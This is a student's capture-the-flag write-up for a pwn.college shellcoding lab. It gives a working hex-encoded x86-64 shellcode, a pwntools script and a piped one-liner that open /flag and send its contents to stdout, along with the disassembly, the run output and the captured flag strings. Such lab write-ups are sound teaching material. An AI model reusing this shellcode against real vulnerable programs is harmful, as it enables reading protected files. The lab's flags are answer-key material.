# Binary Exploitation

## Basic Shellcode

### Solve :

**Flag:** `pwn.college{gYHvkn8ypdNIpg7TiOwOu7AnYLc.dlDOywSO5EzNzEzW}`

Running the challenge file i got
```
hacker@binary-exploitation~basic-shellcode:/challenge$ ./binary-exploitation-basic-shellcode
###
### Welcome to ./binary-exploitation-basic-shellcode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7fff3849c4c0!
Reading 0x1000 bytes from stdin.

```

Based on its ask i made a p7ython snippet
```
from pwn import *

context.arch = 'amd64'

# Shellcode bytes in hex format
shellcode = bytes.fromhex("48c7c002000000488d3d250000004831f64831d20f0548c7c7010000004889c64831d249c7c20010000048c7c0280000000f052f666c616700")

# Connect to the process and send shellcode
p = process('./binary-exploitation-basic-shellcode')
p.send(shellcode)
print(p.recvall().decode())
```
In this, 
- `Open syscall:` opens /flag file with O_RDONLY (syscall #2). The filename location is calculated using RIP-relative addressing which points 37 bytes ahead to where "/flag" string is stored.​
- `Sendfile syscall:` copies file contents from the opened file descriptor to stdout (fd=1) without intermediate buffering and transfers up to 1000 bytes.​
- `bytes.fromhex()` converts the hex string to raw bytes that get piped as stdin to the binary, which executes it as position-independent code on the stack.​

I piped it to the binary and got the output as 
```
hacker@binary-exploitation~basic-shellcode:/challenge$ python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex("48c7c002000000488d3d250000004831f64831d20f0548c7c7010000004889c64831d249c7c20010000048c7c0280000000f052f666c616700"))' | ./binary-exploitation-basic-shellcode
###
### Welcome to ./binary-exploitation-basic-shellcode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffe3f7e7ae0!
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffe3f7e7ae0 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffe3f7e7ae7 | 48 8d 3d 25 00 00 00                          | lea rdi, [rip + 0x25]
0x00007ffe3f7e7aee | 48 31 f6                                      | xor rsi, rsi
0x00007ffe3f7e7af1 | 48 31 d2                                      | xor rdx, rdx
0x00007ffe3f7e7af4 | 0f 05                                         | syscall 
0x00007ffe3f7e7af6 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffe3f7e7afd | 48 89 c6                                      | mov rsi, rax
0x00007ffe3f7e7b00 | 48 31 d2                                      | xor rdx, rdx
0x00007ffe3f7e7b03 | 49 c7 c2 00 10 00 00                          | mov r10, 0x1000
0x00007ffe3f7e7b0a | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffe3f7e7b11 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{IRj_8TShwNtkXYsiiaq5NUzP45b.ddTMywSO5EzNzEzW}
Illegal instruction
```
